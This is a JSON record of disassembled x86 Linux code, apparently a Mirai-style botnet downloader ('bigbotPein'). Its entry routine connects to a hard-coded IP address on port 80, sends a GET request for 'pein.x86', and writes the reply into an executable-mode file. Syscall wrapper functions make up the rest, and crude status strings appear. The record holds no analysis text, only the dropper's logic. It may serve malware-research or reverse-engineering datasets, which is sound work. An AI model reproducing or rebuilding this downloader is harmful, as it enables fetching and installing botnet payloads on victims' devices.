{
    "entry0": {
        "function_address": "0x08048324",
        "instructions": [
            "push ebp",
            "mov eax, section..rodata",
            "mov ebp, esp",
            "push edi",
            "push esi",
            "push ebx",
            "sub esp, 0xac",
            "jmp 0x80481ad",
            "inc eax",
            "cmp byte [eax], 0",
            "jne 0x80481ac",
            "sub eax, section..rodata",
            "mov dword [ebp - 0xb0], eax",
            "push eax",
            "push 5",
            "push str.PEIN_n",
            "push 1",
            "call fcn.08048142",
            "push 0x9d",
            "push 0x9c",
            "push 0x70",
            "push 0xb9",
            "mov word [ebp - 0x20], 2",
            "mov word [ebp - 0x1e], 0x5000",
            "call fcn.08048094",
            "add esp, 0x1c",
            "push 0x1ff",
            "push 0x241",
            "push str.bigbotPein",
            "mov dword [ebp - 0x1c], eax",
            "call fcn.08048103",
            "add esp, 0xc",
            "push 0",
            "push 1",
            "push 2",
            "mov edi, eax",
            "call fcn.08048172",
            "add esp, 0x10",
            "cmp eax, 0xffffffff",
            "mov esi, eax",
            "je 0x8048227",
            "cmp edi, 0xffffffff",
            "jne 0x8048234",
            "sub esp, 0xc",
            "push 1",
            "call fcn.080480dc",
            "add esp, 0x10",
            "push eax",
            "push 0x10",
            "lea eax, [ebp - 0x20]",
            "push eax",
            "push esi",
            "call fcn.0804811b",
            "add esp, 0x10",
            "test eax, eax",
            "mov ebx, eax",
            "jns 0x8048266",
            "push eax",
            "neg ebx",
            "push 5",
            "push str.FREE_n",
            "push 1",
            "call fcn.08048142",
            "mov dword [esp], ebx",
            "call fcn.080480dc",
            "add esp, 0x10",
            "mov ebx, dword [ebp - 0xb0]",
            "push eax",
            "add ebx, 0x1d",
            "push ebx",
            "push str.GET__pein.x86_HTTP_1.0_r_n_r_n",
            "push esi",
            "call fcn.08048142",
            "add esp, 0x10",
            "cmp eax, ebx",
            "je 0x8048290",
            "sub esp, 0xc",
            "push 3",
            "call fcn.080480dc",
            "add esp, 0x10",
            "xor ebx, ebx",
            "push eax",
            "push 1",
            "lea eax, [ebp - 0xd]",
            "push eax",
            "push esi",
            "call fcn.0804815a",
            "add esp, 0x10",
            "dec eax",
            "je 0x80482b2",
            "sub esp, 0xc",
            "push 4",
            "call fcn.080480dc",
            "add esp, 0x10",
            "movsx eax, byte [ebp - 0xd]",
            "shl ebx, 8",
            "or ebx, eax",
            "cmp ebx, 0xd0a0d0a",
            "jne 0x8048292",
            "push ecx",
            "push 0x80",
            "lea ebx, [ebp - 0xa0]",
            "push ebx",
            "push esi",
            "call fcn.0804815a",
            "add esp, 0x10",
            "test eax, eax",
            "jle 0x80482eb",
            "push edx",
            "push eax",
            "push ebx",
            "push edi",
            "call fcn.08048142",
            "add esp, 0x10",
            "jmp 0x80482c3",
            "sub esp, 0xc",
            "push esi",
            "call fcn.080480f1",
            "mov dword [esp], edi",
            "call fcn.080480f1",
            "add esp, 0xc",
            "push 4",
            "push str.GAY_n",
            "push 1",
            "call fcn.08048142",
            "mov dword [esp], 5",
            "call fcn.080480dc",
            "add esp, 0x10",
            "lea esp, [ebp - 0xc]",
            "pop ebx",
            "pop esi",
            "pop edi",
            "pop ebp",
            "ret",
            "push ebp",
            "mov ebp, esp",
            "pop ebp",
            "jmp 0x8048199"
        ]
    },
    "fcn.08048142": {
        "function_address": "0x08048142",
        "instructions": [
            "push ebp",
            "mov ebp, esp",
            "sub esp, 8",
            "push dword [ebp + 0x10]",
            "push dword [ebp + 0xc]",
            "push dword [ebp + 8]",
            "push 4",
            "call fcn.08048330",
            "leave",
            "ret"
        ]
    },
    "fcn.08048094": {
        "function_address": "0x08048094",
        "instructions": [
            "push ebp",
            "mov ebp, esp",
            "movzx edx, byte [ebp + 8]",
            "movzx eax, byte [ebp + 0xc]",
            "movzx ecx, byte [ebp + 0x10]",
            "shl edx, 0x18",
            "shl eax, 0x10",
            "or edx, eax",
            "movzx eax, byte [ebp + 0x14]",
            "shl ecx, 8",
            "pop ebp",
            "or edx, eax",
            "or ecx, edx",
            "mov edx, ecx",
            "mov eax, ecx",
            "and edx, 0xff00",
            "shl edx, 8",
            "shl eax, 0x18",
            "or eax, edx",
            "mov edx, ecx",
            "and ecx, 0xff0000",
            "shr edx, 0x18",
            "shr ecx, 8",
            "or edx, ecx",
            "or eax, edx",
            "ret"
        ]
    },
    "fcn.08048103": {
        "function_address": "0x08048103",
        "instructions": [
            "push ebp",
            "mov ebp, esp",
            "sub esp, 8",
            "push dword [ebp + 0x10]",
            "push dword [ebp + 0xc]",
            "push dword [ebp + 8]",
            "push 5",
            "call fcn.08048330",
            "leave",
            "ret"
        ]
    },
    "fcn.08048172": {
        "function_address": "0x08048172",
        "instructions": [
            "push ebp",
            "mov ebp, esp",
            "sub esp, 0x1c",
            "mov eax, dword [ebp + 8]",
            "mov dword [ebp - 0xc], eax",
            "mov eax, dword [ebp + 0xc]",
            "mov dword [ebp - 8], eax",
            "mov eax, dword [ebp + 0x10]",
            "mov dword [ebp - 4], eax",
            "lea eax, [ebp - 0xc]",
            "push eax",
            "push 1",
            "push 0x66",
            "call fcn.08048330",
            "leave",
            "ret"
        ]
    },
    "fcn.080480dc": {
        "function_address": "0x080480dc",
        "instructions": [
            "push ebp",
            "mov ebp, esp",
            "sub esp, 0x10",
            "push dword [ebp + 8]",
            "push 1",
            "call fcn.08048330",
            "add esp, 0x10",
            "leave",
            "ret"
        ]
    },
    "fcn.0804811b": {
        "function_address": "0x0804811b",
        "instructions": [
            "push ebp",
            "mov ebp, esp",
            "sub esp, 0x1c",
            "mov eax, dword [ebp + 8]",
            "mov dword [ebp - 0xc], eax",
            "mov eax, dword [ebp + 0xc]",
            "mov dword [ebp - 8], eax",
            "mov eax, dword [ebp + 0x10]",
            "mov dword [ebp - 4], eax",
            "lea eax, [ebp - 0xc]",
            "push eax",
            "push 3",
            "push 0x66",
            "call fcn.08048330",
            "leave",
            "ret"
        ]
    },
    "fcn.0804815a": {
        "function_address": "0x0804815a",
        "instructions": [
            "push ebp",
            "mov ebp, esp",
            "sub esp, 8",
            "push dword [ebp + 0x10]",
            "push dword [ebp + 0xc]",
            "push dword [ebp + 8]",
            "push 3",
            "call fcn.08048330",
            "leave",
            "ret"
        ]
    },
    "fcn.080480f1": {
        "function_address": "0x080480f1",
        "instructions": [
            "push ebp",
            "mov ebp, esp",
            "sub esp, 0x10",
            "push dword [ebp + 8]",
            "push 6",
            "call fcn.08048330",
            "leave",
            "ret"
        ]
    },
    "fcn.08048330": {
        "function_address": "0x08048330",
        "instructions": [
            "push ebp",
            "push edi",
            "push esi",
            "push ebx",
            "mov ebp, dword [esp + 0x2c]",
            "mov edi, dword [esp + 0x28]",
            "mov esi, dword [esp + 0x24]",
            "mov edx, dword [esp + 0x20]",
            "mov ecx, dword [esp + 0x1c]",
            "mov ebx, dword [esp + 0x18]",
            "mov eax, dword [esp + 0x14]",
            "int 0x80",
            "pop ebx",
            "pop esi",
            "pop edi",
            "pop ebp",
            "cmp eax, 0xfffff001",
            "jae 0x8048362",
            "ret",
            "sub esp, 0xc",
            "mov edx, eax",
            "neg edx",
            "call fcn.08048377",
            "mov dword [eax], edx",
            "or eax, 0xffffffff",
            "add esp, 0xc",
            "ret"
        ]
    },
    "fcn.08048377": {
        "function_address": "0x08048377",
        "instructions": [
            "mov eax, segment.LOAD1",
            "ret"
        ]
    }
}